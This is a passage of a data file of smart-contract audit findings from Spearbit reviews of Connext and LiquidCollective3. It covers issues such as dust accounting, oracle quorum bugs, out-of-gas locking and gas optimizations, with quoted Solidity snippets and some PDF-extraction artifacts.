["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Some dust not accounted for in reconcile()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The function _handleExecuteLiquidity() in BridgeFacet takes care of rounding issues in toSwap / pathLen. However, the inverse function reconcile() in NomadFacet() does not do that. So, tiny amounts of tokens (dust) are not accounted for in reconcile(). contract BridgeFacet is BaseConnextFacet { ... function _handleExecuteLiquidity(...) ... { ... // For each router, assert they are approved, and deduct liquidity. uint256 routerAmount = toSwap / pathLen; for (uint256 i; i < pathLen - 1; ) { s.routerBalances[_args.routers[i]][_args.local] -= routerAmount; unchecked { ++i; } } // The last router in the multipath will sweep the remaining balance to account for remainder ,! dust. uint256 toSweep = routerAmount + (toSwap % pathLen); s.routerBalances[_args.routers[pathLen - 1]][_args.local] -= toSweep; } } } contract NomadFacet is BaseConnextFacet { ... function reconcile(...) ... { ... uint256 routerAmt = toDistribute / pathLen; for (uint256 i; i < pathLen; ) { s.routerBalances[routers[i]][localToken] += routerAmt; unchecked { ++i; } } } }", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Careful with the decimals of BridgeTokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The BridgeRouter sends token details including the decimals() over the nomad bridge to configure a new deployed token. After setting the hash with setDetailsHash() anyone can call setDetails() on the token to set the details. The decimals() are mainly used for user interfaces so it might not be a large problem when the setDetails() is executed at later point in time. However initializeSwap() also uses decimals(), this is called via offchain code. In the example code of initializeSwap.ts it retrieves the decimals() from the deployed token on the destination chain. This introduces a race condition between setDetails() and initializeSwap.ts, depending on which is executed first, the swaps will have different results. Note: It could also break the ConnextPriceOracle contract BridgeRouter is Version0, Router { ... function _send( ... ) ... { ... if (tokenRegistry.isLocalOrigin(_token)) { ... // query token contract for details and calculate detailsHash _detailsHash = BridgeMessage.getDetailsHash(_t.name(), _t.symbol(), _t.decimals()); } else { ... } } function _handleTransfer(...) ... { ... if (tokenRegistry.isLocalOrigin(_token)) { ... } else { ... IBridgeToken(_token).setDetailsHash(_action.detailsHash()); // so hash is set now } } } contract BridgeToken is Version0, IBridgeToken, OwnableUpgradeable, ERC20 { ... function setDetails(..., uint8 _newDecimals) ... { // can be called by anyone ... require( _isFirstDetails || BridgeMessage.getDetailsHash(..., _newDecimals) == detailsHash, \"!committed details\" ); ... token.decimals = _newDecimals; ... } } Example script: initializeSwap.ts 49 const decimals = await Promise.all([ (await ethers.getContractAt(\"TestERC20\", local)).decimals(), (await ethers.getContractAt(\"TestERC20\", adopted)).decimals(), // setDetails might not have ,! been done ]); const tx = await connext.initializeSwap(..., decimals, ... ); ); contract SwapAdminFacet is BaseConnextFacet { ... function initializeSwap(..., uint8[] memory decimals, ... ) ... { ... for (uint8 i; i < numPooledTokens; ) { ... precisionMultipliers[i] = 10**uint256(SwapUtils.POOL_PRECISION_DECIMALS - decimals[i]); ... } } }", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Incorrect comment about ERC20 approval to zero-address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The linked code notes in a comment: // NOTE: if pool is not registered here, then the approval will fail // as it will approve to the zero-address SafeERC20.safeIncreaseAllowance(IERC20(_assetIn), address(pool), _amount); This is not always true. The ERC20 spec doesnt have this restriction and ERC20 tokens based on solmate also dont revert on approving to zero-address. There is no risk here as the following line of code for zero-address pools will revert. return (pool.swapExact(_amount, _assetIn, _assetOut, minReceived), _assetOut);", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Native asset is delivered even if the wrapped asset is transferred", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "Connext delivers the native asset on the destination chain even if the wrapped asset was transferred. This is because on the source chain the native asset is converted to the wrapped asset, and then the distinction is lost. On the destination chain it is not possible to know which of these two assets was transferred, and hence a choice is made to transfer the native asset. if (_assetId == address(0)) revert AssetLogic__transferAssetFromContract_notNative(); if (_assetId == address(s.wrapper)) { // If dealing with wrapped assets, make sure they are properly unwrapped // before sending from contract s.wrapper.withdraw(_amount); Address.sendValue(payable(_to), _amount); } else { ...", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Entire transfer amount is borrowed from AAVE Portal when a router has insufficient balance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "If the router picked by the Sequencer doesnt have enough balance to transfer the required amount, it can borrow the entire amount from Aave Portal. For a huge amount, it will block borrowing for other routers since there is a limit on the total maximum amount that can be borrowed.", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Unused variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "The variable message is not used after declaration. bytes memory message;", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Incorrect Natspec for adopted and canonical asset mappings", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "adoptedToCanonical maps adopted assets to canonical assets, but is described as a \"Mapping of canonical to adopted assets\"; canonicalToAdopted maps canonical assets to adopted assets, but is described as a \"Mapping of adopted to canonical assets\". // /** // * @notice Mapping of canonical to adopted assets on this domain // * @dev If the adopted asset is the native asset, the keyed address will // * be the wrapped asset address // */ // 12 mapping(address => TokenId) adoptedToCanonical; // /** // * @notice Mapping of adopted to canonical on this domain // * @dev If the adopted asset is the native asset, the stored address will be the // * wrapped asset address // */ // 13 mapping(bytes32 => address) canonicalToAdopted;", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "Use of SafeMath for solc >= 0.8", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf", "body": "AmplificationUtils, SwapUtils, ConnextPriceOracle, GovernanceRouter.sol use SafeMath. Since 0.8.0, arithmetic in solidity reverts if it overflows or underflows, hence there is no need to use open- zeppelins SafeMath library.", "labels": ["Spearbit", "Connext", "Severity: Informational"]}, {"title": "_pickNextValidatorsToExitFromActiveOperators uses the wrong index to query stopped validator count for operators", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "operators does not necessarily have the same order as the actual OperatorsV2's operators, since the ones that don't have _hasExitableKeys will be skipped (the operator might not be active or all of its funded keys might have been requested to exit). And so when querying the stopped validator counts for (uint256 idx = 0; idx < exitableOperatorCount;) { uint32 currentRequestedExits = operators[idx].requestedExits; uint32 currentStoppedCount = _getStoppedValidatorsCountFromRawArray(stoppedValidators, idx); one should not use the idx in the cached operator's array, but the cached index of this array element, as the indexes of stoppedValidators correspond to the actual stored operator's array in storage. Note that when emitting the UpdatedRequestedValidatorExitsUponStopped event, the correct index has been used.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Critical Risk"]}, {"title": "Oracles' reports votes are not stored in storage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The purpose of Oracle.1.sol is to facilitate the reporting and quorum of oracles. Oracles period- ically add their reports and when consensus is reached the setConsensusLayerData function (which is a critical component of the system) is called. However, there is an issue with the current implementation as ReportVari- ants holds the reports made by oracles but ReportVariants.get() returns a memory array instead of a storage array, therefore resulting in an increase in votes that will not be stored at the end of the transaction and prevent- ing setConsensusLayerData from being called. This is a regression bug that should have been detected by a comprehensive test suite.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Critical Risk"]}, {"title": "User's LsETH might be locked due to out-of-gas error during recursive calls", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Let W0, W1, ...W7 represent the withdrawal events in the withdrawal stack. Let R0, R1, R2 represent the users' redeem requests in the redeem queue. Assume that Alice is the owner of R1. When Alice called the resolveRedeemRequests function against R1, it will resolve to W 1. Next, Alice called the _claimRedeemRequest function with R1 and its corresponding W 1. The _claimRedeemRequest will first process W 1. At the end of the function, it will check if W 1 matches all the amounts of R1. If not, it will call the _claimRedeemRequest function recursively with the same request id (R1) but increment the withdrawal event id (W2 = W1 + 1). The _claimRedeemRequest function recursively calls itself until all the amount of redeem request is \"expended\" or the next withdrawal event does not exist. In the above example, the _claimRedeemRequest will be called 7 times with W1...W7, until all the amount of R1 is \"expended\" (R1.amount == 0) However, if the amount of a redeem request is large (e.g. 1000 LsETH), and this redeem request is satisfied by many small chunks of withdrawal events (e.g. one withdrawal event consists of less than 10 LsETH), then the recursion depth will be large. The function will keep calling itself recursively until an out-of-gas error happens. If this happens, there is no way to claim the redemption request, and the user's LsETH will be locked. In the current implementation, users cannot break the claim into smaller chunks to overcome the gas limit. In the above example, if Alice attempts to break the claim into smaller chunks by first calling the _claimRedeemRequest function with R1 and its corresponding W5, the _isMatch function within it will revert.", "labels": ["Spearbit", "LiquidCollective3", "Severity: High Risk"]}, {"title": "Allowed users can directly transfer their share to RedeemManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "An allowed user can directly transfer its shares to the RedeemManager without requesting a redeem. This would cause the withdrawal stack to grow, since the redeem demand (2) which is calculated based on the RedeemManager's share of LsETH increases. RedeemQueue would be untouched in this case. In case of an accidental mistake by a user, the locked shares can only be retrieved by a protocol update.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Medium Risk"]}, {"title": "Invariants are not enforced for stopped validator counts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "_setStoppedValidatorCounts does not enforce the following invariants:  stoppedValidatorCounts[0] <= DepositedValidatorCount.get()  stoppedValidatorCounts[i] needs to be a non-decreasing function when viewed on a timeline  stoppedValidatorCounts[i] needs to be less than or equal to the funded number of validators for the corresponding operator. Currently, the oracle members can report values that would break these invariants. As a consequence, the oracle members can signal the operators to exit more or fewer validators by manipulating the preExitingBalance value. And activeCount for exiting validators picking algorithm can also be manipulated per operator.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Medium Risk"]}, {"title": "Potential out of gas exceptions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The purpose of _requestExitsBasedOnRedeemDemandAfterRebalancings is to release liquidity for withdrawals made in the RedeemManager contract. The function prioritizes liquidity sources, starting with Balance- ToRedeem and then BalanceToDeposit, before asking validators to exit. However, if the validators are needed to release more liquidity, the function uses pickNextValidatorsToExit to determine which validators to ask to exit. This process can be quite gas-intensive, especially if the number of validators is large. The gas consumption of this function depends on several factors, including exitableOperatorCount, stoppedVal- idators.length, and the rate of decrease of _count. These factors may increase over time, and the msg.sender does not have control over them. The function includes two nested loops that contribute to the overall gas con- sumption, and this can be problematic for certain inputs. For example, if the operators array has no duplications and the difference between values is exactly 1, such as [n, n-1, n-2 ... n-k] where n can be any number and k is a large number equals exitableOperatorCount - 1 and _count is also large, the function can become extremely gas-intensive. The main consequence of such a potential issue is that the function may not release enough liquidity to the RedeemManager contract, resulting in partial fulfillment of redemption requests. Similarly, _pickNextValidatorsToDepositFromActiveOperators is also very gas intensive. If the number of de- sired validators and current operators (including fundable operators) are high enough, depositToConsensusLayer is no longer callable.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Medium Risk"]}, {"title": "The validator count to exit in _requestExitsBasedOnRedeemDemandAfterRebalancings assumes that the to-be selected validators are still active and have not been penalised.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The validatorCountToExit is calculated as follows uint256 validatorCountToExit = LibUint256.ceil( redeemManagerDemandInEth - (availableBalanceToRedeem + exitingBalance + preExitingBalance), DEPOSIT_SIZE ); This formula assumes that the to-be selected validators exit by the pickNextValidatorsToExit are: 1. Still active 2. Have not been queued to be exited and 3. Have not been penalized and their balance is at least MAX_EFFECTIVE_BALANCE", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Burn RedeemManager's share first before calling its reportWithdraw endpoint", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "reportWithdraw and then burns the corresponding shares for the RedeemManager The current implementation of _reportWithdrawToRedeemManager calls RedeemManager's // perform a report withdraw call to the redeem manager redeemManager_.reportWithdraw{value: suppliedRedeemManagerDemandInEth}(suppliedRedeemManagerDemand); // we burn the shares of the redeem manager associated with the amount of eth provided _burnRawShares(address(RedeemManagerAddress.get()), suppliedRedeemManagerDemand);", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "OracleManager allows reporting for the same epoch multiple times, leading to unknown behavior.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Currently, it is possible for the oracle to report on the same epoch multiple times, because _- isValidEpoch checks that the report's epoch >= LastConsensusLayerReport.get().epoch. This can lead the contract to unspecified behavior  The code will revert if the report increases the balance, not with an explicit check but reverting due to a subtraction underflow, since maxIncrease == 0 and  Allowing other code paths to execute to completion.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Missing event emit when user calls deposit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Whenever BalanceToDeposit is updated, the protocol should emit a SetBalanceToDeposit, but when a user calls UserDepositManager.deposit, the event is never emitted which could break tooling.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Reset the report data and increment the last epoch id before calling River's setConsensusLayerData when a quorum is made", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The current implementation of reportConsensusLayerData calls river.setConsensusLayerData(report) first when a quorum is made then resets the report variant and position data and also it increment the last epoch id afterward // if adding this vote reaches quorum if (variantVotes + 1 >= quorum) { // we push the report to river river.setConsensusLayerData(report); // we clear the reporting data _clearReports(); // we increment the lastReportedEpoch to force reports to be on the last frame LastEpochId.set(lastReportedEpochValue + 1); emit SetLastReportedEpoch(lastReportedEpochValue + 1); } In the future version of the protocol there might be a possibility for an oracle member to call back into reportCon- sensusLayerData when river.setConsensusLayerData(report) is called and so it would open a reentrancy for compromised/malicious oracle members.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Update BufferedExceedingEth before calling sendRedeemManagerExceedingFunds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "In pullExceedingEth , River's sendRedeemManagerExceedingFunds is called before updating the RedeemManager's BufferedExceedingEth storage value _river().sendRedeemManagerExceedingFunds{value: amountToSend}(); BufferedExceedingEth.set(BufferedExceedingEth.get() - amountToSend);", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Any oracle member can censor almost quorum report variants by resetting its address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The admin or an oracle member can DoS or censor almost quorum reports by calling setMember endpoint which would reset the report variants and report positions. The admin also can reset the/clear the reports by calling other endpoints by that should be less of an issue compared to just an oracle member doing that.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Incentive mechanism that encourages operators to respond quickly to exit requests might diminish under certain condition", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "/// @notice Retrieve all the active and fundable operators /// @dev This method will return a memory array of length equal to the number of operator, but /// @dev populated up to the fundable operator count, also returned by the method /// @return The list of active and fundable operators /// @return The count of active and fundable operators function getAllFundable() internal view returns (CachedOperator[] memory, uint256) { // uint32[] storage stoppedValidatorCounts = getStoppedValidators(); for (uint256 idx = 0; idx < operatorCount;) { _hasFundableKeys(r.value[idx]) && _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) >= r.value[idx].requestedExits only @audit-ok File: Operators.2.sol 153: 154: ,! 155: 156: 157: 158: ,! ..SNIP.. 172: 173: 174: 175: 176: 177: ,! 178: if ( ) { r.value[idx].requestedExits is the accumulative number of requested validator exits by the protocol _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) function is a value reported by oracle members which consist of both exited and slashed validator counts It was understood the rationale of having the _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) >= r.value[idx].requestedExits conditional check at Line 177 above is to incentivize operators to re- In other words, an operator with a re- spond quickly to exit requests if they want new stakes from deposits. questedExits value larger than the _getStoppedValidatorCountAtIndex count indicates that an operator did not submit exit requests to the Consensus Layer (CL) in a timely manner or the exit requests have not been finalized in CL. However, it was observed that the incentive mechanism might not work as expected in some instances. Consider the following scenario: Assuming an operator called A has 5 slashed validators and 0 exited validators, the _getStoppedValidator- CountAtIndex function will return 5 for A since this function takes into consideration both stopped and slashed validators. Also, assume that the requestedExits of A is 5, which means that A has been instructed by the protocol to submit 5 exit requests to CL. In this case, the incentive mechanism seems to diminish as A will still be considered a fundable operator even if A does not respond to exit requests since the number of slashed validators is enough to \"help\" to push up the stopped validator count to satisfy the condition, giving the wrong impression that A has already submitted the exit requests. As such, A will continue to be selected to stake new deposits.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "RedeemManager. _claimRedeemRequests transaction sender might be tricked to pay more eth in trans- action fees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The _claimRedeemRequests function is designed to allow anyone to claim ETH on behalf of another party who has a valid redeem request. The function iterates through the redeemRequestIds list and fulfills each request individually. However, it is important to note that the transfer of ETH to the recipients is only limited by the 63/64 rule, which means that it is possible for a recipient to take advantage of a heavy fallback function and potentially cause the sender to pay a significant amount of unwanted transaction fees.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Claimable LsETH on the Withdraw Stack could exceed total LsETH requested on the Redeem Queue", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Let the total amount of claimable LsETH on the Withdraw Stack be x and the total amount of LsETH requested on the Redeem Queue be y. The following points are extracted from the Withdrawals Smart Contract Architecture documentation:  The design ensures that x <= y . Refer to page 15 of the documentation.  It is impossible for a redeem request to be claimed before at least one Oracle report has occurred, so it is impossible to skip a slashing time penalty. Refer to page 16 of the documentation. Based on the above information, the main purpose of the design (x <= y) is to avoid favorable treatment of LsETH holders that would request a redemption before others following a slashing incident. However, this constraint (x <= y ) is not being enforced in the contract. The reporter could continue to report withdrawal via the RedeemManager.reportWithdraw function till the point x > y. If x > y, LsETH holders could request a redemption before others following a slashing incident to gain an advan- tage.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "An oracle member can resubmit data for the same epoch multiple times if the quorum is set to 1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "If the quorum is set to 1 and the difference between the report's epoch e and LastEpochId.get() is (cid:1)e, an oracle member will be able to call reportConsensusLayerData (cid:1)e + 1 times to push its report for epoch e to the protocol and with different data each time (only restriction on successive reports is that the difference of underlying balance between reports would need to be negative since the maxIncrease will be 0). Note that in reportConsensusLayerData the first storage write to LastEpochId will be overwritten later due to quorum of one: x = LastEpochId -> report.epoch -> x + 1", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Report's validatorsCount's historical non-decreseness does not get checked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Once the Oracle members come to a quorum for a selected report variant, the validators count is stored in the storage. Note that validatorsCount is supposed to represent the total cumulative number of validators ever funded on consensus layer (even if they have been slashed or exited at some point ). So this value is supposed to be a non-decreasing function of reported epochs. But this invariant has never been checked in setConsensusLayerData.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "The report's slashingContainmentMode and bufferRebalancingMode are decided by the oracle mem- bers which affects the exiting strategy of validators", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The current protocol leaves it up to the oracle members to come to a quorum to set either of the report.slashingContainmentMode or report.bufferRebalancingMode to true or false. That means the oracle members have the power to decide off-chain whether validators should be exited and whether some of the deposit balance should be reallocated for redeeming (vs an algorithmic decision by the protocol on-chain). A potential bad scenario would be oracle members deciding to not signal for new validators to exit and from the time for the current epoch to the next report some validators get penalized or slashed which would reduce the If those validators would have exited before getting slashed or penalized, the underlying value of the shares. redeemers would have received more ETH back for their investment.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Anyone can call depositToConsensusLayer and potentially push wrong data on-chain", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Anyone can call depositToConsensusLayer and potentially push wrong data on-chain. An example is when an operator would want to remove a validator key that is not-funded yet but has an index below the operator limit and will be picked by the strategy if depositToConsensusLayer is called. Then anyone can front run the removal call by the operator and force push this validator's info to the deposit contract.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Low Risk"]}, {"title": "Calculation of currentMaxCommittableAmount can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "currentMaxCommittableAmount is calculated as: // we adapt the value for the reporting period by using the asset balance as upper bound uint256 underlyingAssetBalance = _assetBalance(); uint256 currentBalanceToDeposit = BalanceToDeposit.get(); ... uint256 currentMaxCommittableAmount = LibUint256.min( LibUint256.min(underlyingAssetBalance, (currentMaxDailyCommittableAmount * period) / 1 days), currentBalanceToDeposit ); But underlyingAssetBalance is Bu = Bv +Bd +Bc +Br +32(Cd (cid:0)Cr ) which is greater than currentBalanceToDeposit Bd since the other components are non-negative values. parameter description Bv Bd Bc Br Cd Cr M m Bu LastConsensusLayerReport.get().validatorsBalance BalanceToDeposit.get() CommittedBalance.get() BalanceToRedeem.get() DepositedValidatorCount.get() LastConsensusLayerReport.get().validatorsCount currentMaxCommittableAmount currentMaxDailyCommittableAmount * period) / 1 days underlyingAssetBalance Note that the fact that Cd (cid:21) Cr is an invariant that is enforced by the protocol. and so currently we are computing M as: M = min(Bu, Bd , m) = min(Bd , m) since Bu (cid:21) Bd .", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "Remove redundant array length check and variable to save gas.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "When someone calls ConsensusLayerDepositManager.depositToConsensusLayer, the contract will verify that the receivedSignatureCount matches the receivedPublicKeyCount returned from _getNextVal- idators. This is unnecessary as the code always creates them with the same length.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "Duplicated events emitted in River and RedeemManager", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The amount of ETH pulled from the redeem contract when setConsensusData is called by the oracle is notified with events in both RedeemManager and River contracts.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "totalRequestedExitsValue's calculation can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "In the for loop in this context, totalRequestedExitsValue is updated for every operator that sat- isfies _getActiveValidatorCountForExitRequests(operators[idx]) == highestActiveCount. Based on the used increments, their sum equals to optimalTotalDispatchCount.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "Report's bufferRebalancingMode and slashingContainmentMode are only used during the reporting transaction process", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "report.bufferRebalancingMode and report.slashingContainmentMode are only used during the transaction and their previous values are not used in the protocol. They can be removed from being added to the stored report. Note that their historical values can be queried by listening to the ProcessedConsensusLayerReport(report, vars.trace) events.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Gas Optimization"]}, {"title": "Add more comments/documentation for ConsensusLayerReport and StoredConsensusLayerReport structs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "The ConsensusLayerReport and StoredConsensusLayerReport structs are defined as /// @notice The format of the oracle report struct ConsensusLayerReport { uint256 epoch; uint256 validatorsBalance; uint256 validatorsSkimmedBalance; uint256 validatorsExitedBalance; uint256 validatorsExitingBalance; uint32 validatorsCount; uint32[] stoppedValidatorCountPerOperator; bool bufferRebalancingMode; bool slashingContainmentMode; } /// @notice The format of the oracle report in storage struct StoredConsensusLayerReport { uint256 epoch; uint256 validatorsBalance; uint256 validatorsSkimmedBalance; uint256 validatorsExitedBalance; uint256 validatorsExitingBalance; uint32 validatorsCount; bool bufferRebalancingMode; bool slashingContainmentMode; } Comments regarding their specified fields are lacking.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "postUnderlyingBalanceIncludingExits and preUnderlyingBalanceIncludingExits can be removed from setConsensusLayerData", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "Both postUnderlyingBalanceIncludingExits ( Bpost ) and preUnderlyingBalanceIncludingEx- its ( Bpre ) include the accumulated skimmed and exited amounts overtime which part of them might have exited the protocol through redeeming (or skimmed back to CL and penalized). Their delta is almost the same as the delta of vars.postReportUnderlyingBalance and vars.preReportUnderlyingBalance (almost if one adds a check for non-decreases of validator counts). u u : postUnderlyingBalanceIncludingExits u : preUnderlyingBalanceIncludingExits u (cid:0) Bpre u : vars.postReportUnderlyingBalance : vars.preReportUnderlyingBalance : Breport,post (cid:0) Breport,pre u u  Bpost u  Bpre  (cid:1)Bu: Bpost  Breport,post  Breport,pre u  (cid:1)Breport u  Bprev v : u  Bcurr v  (cid:1)Bv : Bcurr  Bprev s  Bcurr s  (cid:1)Bs: Bcurr  Bprev e  Bcurr e  (cid:1)Be: Bcurr previous reported/stored value for total validator balances in CL LastConsensusLayerRe- port.get().validatorsBalance v (cid:0) Bprev v (can be negative) : current reported value of total validator balances in CL report.validatorsBalance : LastConsensusLayerReport.get().validatorsSkimmedBalance : report.validatorsSkimmedBalance s (cid:0) Bprev s (always non-negative, this is an invariant that gets checked). : LastConsensusLayerReport.get().validatorsExitedBalance : report.validatorsExitedBalance e (cid:0) Bprev e (always non-negative, this is an invariant that gets checked).  $C{prev} $: LastConsensusLayerReport.get().validatorsCount  Ccurr : report.validatorsCount  (cid:1)C: Ccurr (cid:0) Cprev (this value should be non-negative, note this invariant has not been checked in the code- base)  Cdeposit : DepositedValidatorCount.get()  Bd : BalanceToDeposit.get() 22  Bc: CommittedBalance.get()  Br : BalanceToRedeem.get() Note that the above values are assumed to be in their form before the current report gets stored in the storage. Then we would have Bpost u = Bcurr v + Bcurr s + Bcurr e = Bpre u + (cid:1)Bv + (cid:1)Bs + (cid:1)Be (cid:0) 32(cid:1)C and so: (cid:1)Bu = (cid:1)Bv + (cid:1)Bs + (cid:1)Be (cid:0) 32(cid:1)C = (cid:1)Breport u", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "The formula or the parameter names for calculating currentMaxDailyCommittableAmount can be made more clear", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "currentMaxDailyCommittableAmount is calculated using the below formula: // we compute the max daily committable amount by taking the asset balance without the balance to deposit into account ,! uint256 currentMaxDailyCommittableAmount = LibUint256.max( dcl.maxDailyNetCommittableAmount, (uint256(dcl.maxDailyRelativeCommittableAmount) * (underlyingAssetBalance - ,! currentBalanceToDeposit)) / LibBasisPoints.BASIS_POINTS_MAX ); Therefore its value is the maximum of two potential maximum values.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "preExitingBalance is a rough estimate for signalling the number of validators to request to exit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "exitingBalance and preExitingBalance might be trying to compensate for the same portion of balance (non-stopped validators which have been signaled to exit and are in the CL exit queue). That means the number of validatorCountToExit calculated to accommodate for the redeem demand is actually lower than what is required. The important portion of preExitingBalance is for the validators that were singled to exit in the previous reporting round but the operators have not registered them for exit in CL. Also totalStoppedValidatorCount can include slashed validator counts which again lowers the required validatorCountToExit and those values should not be accounted for here. Perhaps the oracle members should also report the slashing counts of validators so that one can calculate these values more accurately.", "labels": ["Spearbit", "LiquidCollective3", "Severity: Informational"]}, {"title": "More documentation can be added regarding the currentMaxDailyCommittableAmount calculation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf", "body": "currentMaxDailyCommittableAmount calculated as // we compute the max daily committable amount by taking the asset balance without the balance to deposit into the account ,! uint256 currentMaxDailyCommittableAmount = LibUint256.max( dcl.maxDailyNetCommittableAmount, (uint256(dcl.maxDailyRelativeCommittableAmount) * (underlyingAssetBalance - ,! currentBalanceToDeposit)) / LibBasisPoints.BASIS_POINTS_MAX ); We can add further to the comment: Since before the _commitBalanceToDeposit hook is called we have skimmed the remaining to redeem balance to BalanceToDeposit, underlyingAssetBalance - currentBalanceToDeposit represent the funds allocated for CL (funds that are already in CL, funds that are in transit to CL or funds 